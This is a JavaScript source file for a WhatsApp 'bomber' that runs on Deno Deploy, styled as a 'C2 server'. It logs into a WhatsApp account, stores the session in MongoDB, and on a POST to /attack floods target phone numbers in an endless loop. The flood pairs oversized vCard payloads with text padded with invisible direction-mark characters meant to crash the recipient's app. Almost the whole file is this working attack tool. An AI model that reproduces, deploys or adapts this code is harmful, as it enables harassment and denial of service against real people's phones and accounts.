// deno_bomber.js
// Compatible with Deno Deploy (Node Compatibility Mode)

import { 
    default as makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    delay, 
    makeCacheableSignalKeyStore,
    proto 
} from 'npm:@whiskeysockets/baileys';
import { Boom } from 'npm:@hapi/boom';
import pino from 'npm:pino';
import express from 'npm:express';
import { MongoClient } from 'npm:mongodb';

const app = express();
app.use(express.json());

// --- MONGODB AUTH ADAPTER ---
// We need to implement a custom AuthState that reads/writes to MongoDB
// instead of the local file system because Deno Deploy is read-only.

let mongoClient;
let db;
let collection;

const MONGO_URL = Deno.env.get("MONGO_URL") || process.env.MONGO_URL;

async function connectMongo() {
    if (!MONGO_URL) {
        console.error("FATAL: MONGO_URL environment variable is missing!");
        process.exit(1);
    }
    if (!mongoClient) {
        mongoClient = new MongoClient(MONGO_URL);
        await mongoClient.connect();
        db = mongoClient.db("whatsapp_bot");
        collection = db.collection("auth_state");
        console.log("[✔] Connected to MongoDB Atlas");
    }
}

const useMongoDBAuthState = async (collection) => {
    // 1. Read existing creds from DB or init new
    const readData = async (key) => {
        const data = await collection.findOne({ _id: key });
        if (data) return JSON.parse(JSON.stringify(data.value), (key, value) => {
            // Revive Buffer objects from JSON
            if (value && value.type === 'Buffer' && Array.isArray(value.data)) {
                return Buffer.from(value.data);
            }
            return value;
        });
        return null;
    };

    const writeData = async (data, key) => {
        await collection.updateOne(
            { _id: key },
            { $set: { value: data } },
            { upsert: true }
        );
    };

    const removeData = async (key) => {
        await collection.deleteOne({ _id: key });
    };

    const creds = await readData("creds") || (await import("npm:@whiskeysockets/baileys")).initAuthCreds();

    return {
        state: {
            creds,
            keys: {
                get: async (type, ids) => {
                    const data = {};
                    await Promise.all(ids.map(async (id) => {
                        let value = await readData(`${type}-${id}`);
                        if (type === 'app-state-sync-key' && value) {
                            value = proto.Message.AppStateSyncKeyData.fromObject(value);
                        }
                        data[id] = value;
                    }));
                    return data;
                },
                set: async (data) => {
                    const tasks = [];
                    for (const category in data) {
                        for (const id in data[category]) {
                            const value = data[category][id];
                            const key = `${category}-${id}`;
                            if (value) {
                                tasks.push(writeData(value, key));
                            } else {
                                tasks.push(removeData(key));
                            }
                        }
                    }
                    await Promise.all(tasks);
                }
            }
        },
        saveCreds: () => writeData(creds, "creds")
    };
};


// --- BOT LOGIC ---

let isAttacking = false;
let activeSock = null;
let currentTargets = [];

async function startSock() {
    await connectMongo();
    const { state, saveCreds } = await useMongoDBAuthState(collection);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: true, // Will print in Deno logs
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: ["MALXGMN (Deno)", "Chrome", "1.0.0"],
        generateHighQualityLinkPreview: true,
    });

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr) {
            console.log('
[!] SCAN QR CODE IN DENO LOGS:
');
            // Deno logs might truncate QR, use online QR generator with this code if needed
            console.log(qr); 
        }

        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom)
                ? lastDisconnect.error.output?.statusCode !== DisconnectReason.loggedOut
                : true;
            
            console.log('[!] Connection closed. Reconnecting:', shouldReconnect);
            if (shouldReconnect) startSock();
        } else if (connection === 'open') {
            console.log('[+] WHATSAPP CONNECTED ON DENO!');
            activeSock = sock;
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

// --- ATTACK LOGIC (SAME AS BEFORE) ---

async function runAttackLoop(rawTargets) {
    isAttacking = true;
    currentTargets = rawTargets;
    const targetJids = rawTargets.map(t => t.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
    
    console.log(`[!] ATTACK STARTED: ${targetJids.join(', ')}`);
    
    // Payloads
    let heavyVcardContent = '';
    for(let i=0; i<1500; i++) heavyVcardContent += 'BEGIN:VCARD
VERSION:3.0
FN:' + '🔥'.repeat(10) + 'OVERLOAD_' + i + '
TEL;type=CELL;waid=0:0
END:VCARD
';
    
    const vcardPayload = { contacts: { displayName: '☠️', contacts: [{ vcard: heavyVcardContent }] } };
    const crashText = "💣" + "\u200e\u200f".repeat(500);

    let counter = 0;
    while(isAttacking) {
        try {
            if (!activeSock) { await delay(5000); continue; }
            counter++;
            
            const batchTasks = [];
            for (const jid of targetJids) {
                batchTasks.push(activeSock.sendMessage(jid, vcardPayload));
                batchTasks.push(activeSock.sendMessage(jid, { text: crashText }));
            }
            await Promise.all(batchTasks);
            console.log(`[${counter}] Batch Sent`);
            await delay(200); 
        } catch (e) {
            console.log(`[!] Error: ${e.message}`);
            await delay(1000);
        }
    }
}

// --- API ROUTES ---

app.get('/', (req, res) => res.send('MALXGMN C2 SERVER (DENO) IS RUNNING'));

app.post('/attack', (req, res) => {
    if (!activeSock) return res.status(503).json({ status: 'ERROR', msg: 'WA Disconnected' });
    if (isAttacking) return res.status(409).json({ status: 'BUSY', msg: 'Attack in progress' });
    
    const { targets } = req.body;
    if (!targets || !Array.isArray(targets)) return res.status(400).json({ msg: 'Invalid targets' });

    runAttackLoop(targets);
    res.json({ status: 'STARTED', targets });
});

app.post('/stop', (req, res) => {
    isAttacking = false;
    res.json({ status: 'STOPPED' });
});

// START
startSock();
const PORT = 8000;
app.listen(PORT, () => console.log(`[SERVER] Listening on port ${PORT}`));
